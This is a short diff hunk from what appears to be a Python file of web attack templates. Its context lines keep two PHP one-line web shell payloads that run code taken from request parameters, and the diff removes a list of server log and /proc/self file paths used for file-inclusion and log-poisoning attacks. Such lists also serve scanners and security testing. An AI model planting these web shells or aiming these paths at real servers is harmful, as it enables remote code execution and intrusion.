@@ -216,14 +216,3 @@ WEBSHELL_TEMPLATES = [
     "assert($_POST[x]);",
     "call_user_func($_GET[x], $_GET[y]);",
 ]
-
-# 日志
-LOG_INCLUSION_TEMPLATES = [
-    "/var/log/nginx/access.log",
-    "/var/log/apache2/access.log",
-    "/var/log/httpd/access_log",
-    "/proc/self/environ",
-    "/proc/self/fd/0",
-    "/proc/self/fd/1",
-    "/proc/self/fd/2",
-]
